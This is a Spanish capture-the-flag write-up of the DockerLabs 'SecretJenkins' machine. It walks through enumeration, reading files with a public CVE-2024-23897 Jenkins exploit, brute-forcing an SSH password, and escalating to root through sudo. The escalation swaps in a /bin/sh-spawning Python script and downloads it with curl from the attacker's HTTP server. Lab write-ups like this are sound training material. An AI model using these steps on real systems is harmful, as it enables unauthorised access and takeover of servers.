---
title: SecretJenkins - DockerLabs
published: true
categories: DockerLabs
---

| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  | Fácil       | ElPinguinoDeMario | 

# Reconocimiento

Tenemos el puerto 22 y el puerto 8080 abiertos.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ffed63a6-58f3-4b19-aca0-ef157a3f4c52)

## Puerto 8080

Exploramos el puerto 8080 y encontramos una página de inicio de sesión de Jenkins.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0ec45e26-45a0-43c8-864d-7179685f9635)

Realizamos un reconocimiento con gobuster y encontramos varias rutas.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/17f3f48e-52a3-46b9-a031-d2e4e0b74984)

Descubrimos la ruta `/Index` que muestra dos usuarios.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/19d1b638-d527-4193-9eb1-a3a2316a1e07)

Gobuster también encontró la ruta `/main`.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a741f4fe-5508-440a-8d79-79799c36447b)

Esta ruta nos muestra la versión de Jenkins, lo que nos permite buscar exploits.

Encontramos un exploit en [GitHub - CVE-2024-23897](https://github.com/godylockz/CVE-2024-23897). Esta versión de Jenkins es vulnerable a un LFI.

Ejecutamos el script del exploit y podemos ver archivos del sistema. Listamos el contenido de `/etc/passwd` para ver los usuarios existentes.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/881f4dc8-6ef8-4f43-85db-920860576b0a)

Encontramos los usuarios `pinguinito` y `bobby`. Realizamos un ataque de fuerza bruta para encontrar la contraseña por SSH y logramos encontrarla.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0d6e45ba-8dda-4e14-a7ad-4a447824cac3)

Para el usuario `bobby`, la contraseña es `chocolate`. Iniciamos sesión en SSH.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/35120cf7-026c-4899-a0a0-f18418e7b409)

Ejecutamos `sudo -l` y vemos que podemos escalar privilegios a `pinguinito` utilizando `python3`.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/8b554858-2e4f-41b4-b658-309e673cd330)

Ahora somos `pinguinito`. Ejecutamos `sudo -l` de nuevo y descubrimos que podemos ejecutar un script como root sin proporcionar la contraseña. Inspeccionamos el script.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/cbea6aaa-6e52-4950-a70d-bea137a23254)


Eliminamos el script de `/opt` y creamos uno nuevo en nuestra máquina atacante que abrirá una terminal con el siguiente código:

```python
import os

os.system("/bin/sh")
```

Subimos el script a la máquina víctima de la siguiente manera:

En la máquina atacante:

```bash
python -m http.server 80
```

En la máquina víctima:

```bash
curl -O http://172.17.0.2
```

Ejecutamos el script como root y obtenemos una shell como root.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/63355776-2979-46c9-807e-2b0dff15588c)

